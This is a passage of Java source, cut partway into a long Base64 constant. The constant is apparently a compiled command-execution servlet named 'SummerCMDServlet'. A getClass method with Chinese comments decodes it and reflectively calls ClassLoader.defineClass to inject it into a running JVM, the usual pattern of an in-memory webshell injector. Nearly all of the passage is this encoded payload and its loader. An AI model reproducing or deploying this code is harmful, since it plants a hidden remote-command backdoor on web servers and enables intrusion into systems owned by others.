V0L1NlcnZsZXRSZXNwb25zZTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwCbAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAcAjQcAngEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAKABABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAOZ2V0U2VydmxldEluZm8BAAdkZXN0cm95AQAKU291cmNlRmlsZQEAFVN1bW1lckNNRFNlcnZsZXQuamF2YQAhAHIAAgABAHQAAAAGAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAgB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAH8AAAAEAAEAgAABAIIAgwABAHYAAAAsAAEAAQAAAAIBsAAAAAIAdwAAAAYAAQAAABkAeAAAAAwAAQAAAAIAeQB6AAAAAQCEAIUAAgB2AAACjQAEAA4AAADsLBIHuQAJAgAsEg+5ABECACy5ABQBABIYtgAaK8AAH04tEiG5ACMCADoEGQTGAL8ENgUSJ7gAKToGGQbGABMZBrYALhI0tgA2mQAGAzYFFQWZABkGvQAvWQMSOlNZBBI8U1kFGQRTpwAWBr0AL1kDEj5TWQQSQFNZBRkEUzoHuABCGQe2AEi2AEw6CLsAUlkZCLcAVBJXtgBZOgkZCbYAXZkACxkJtgBhpwAFEmQ6Ciy5ABQBADoLGQsZCrYAGhkLtgBmGQvGACYZC7YAaacAHjoMGQvGABQZC7YAaacADDoNGQwZDbYAbhkMv7EAAgC3AMMA0ABsANcA3ADfAGwAAwB3AAAAVgAVAAAAHwAIACAAEAAhABsAIgAgACMAKgAkAC8AJQAyACYAOQAnAEsAKABOACoAaQArAH4ALACLAC0AmwAuAK8ALwC3ADAAvgAxAMMAMgDQAC8A6wA0AHgAAAB6AAwAtwA0AIYAhwALADIAuQCIAIkABQA5ALIAigCLAAYAfgBtAIwAjQAHAIsAYACOAI8ACACbAFAAkACRAAkArwA8AJIAiwAKAAAA7AB5AHoAAAAAAOwAkwCUAAEAAADsAJUAlgACACAAzACXAJgAAwAqAMIAIgCLAAQAmQAAAKMACf8ATgAHBwByBwCaBwAKBwAfBwAvAQcALwAAGlIHAJz+AC4HAJwHAJ0HAFJBBwAv/wAiAAwHAHIHAJoHAAoHAB8HAC8BBwAvBwCcBwCdBwBSBwAvBwAbAAEHAGz/AA4ADQcAcgcAmgcACgcAHwcALwEHAC8HAJwHAJ0HAFIHAC8HABsHAGwAAQcAbAj/AAIABQcAcgcAmgcACgcAHwcALwAAAH8AAAAGAAIAgACfAAEAoQAzAAEAdgAAACwAAQABAAAAAgGwAAAAAgB3AAAABgABAAAAOAB4AAAADAABAAAAAgB5AHoAAAABAKIABgABAHYAAAArAAAAAQAAAAGxAAAAAgB3AAAABgABAAAAPQB4AAAADAABAAAAAQB5AHoAAAABAKMAAAACAKQ=";


    public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException,
            IllegalAccessException, NoSuchMethodException, InstantiationException {
        // 获取当前线程的上下文类加载器 ClassLoader
        ClassLoader loader = Thread.currentThread().getContextClassLoader();
        // 使用 Base64 解码一个Java类class文件的二进制数据的Base64编码的字符串成字节数组
        Base64.Decoder base64Decoder = Base64.getDecoder();
        byte[] decodeBytes = base64Decoder.decode(classCode);

        // 通过反射调用ClassLoader的defineClass方法，将字节数组转换为Class对象
        Method method = null;
        Class<?> clz = loader.getClass();
        // 在一个 while 循环中不断尝试获取该方法，如果当前类 clz 中没有找到 defineClass 方法，则继续向其父类查找，直到找到该方法或到达
        // Object 类为止
        while (method == null && clz != Object.class) {
            try {
                method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            } catch (NoSuchMethodException ex) {
                clz = clz.getSuperclass();
            }
        }
        if (method != null) {
            // 一旦找到了 defineClass 方法，代码将其设置为可访问的（即使该方法是私有的）
            method.setAccessible(true);
            // 通过反射调用该方法，将解码后的字节数组 decodeBytes 转换为一个 Class 对象并返回
            return (Class<?>) method.invoke(loader, decodeBytes, 0, decodeBytes.length);
        }
        // 如果在整个过程中未能找到 defineClass 方法，则返回 null。
        return null;
    }
}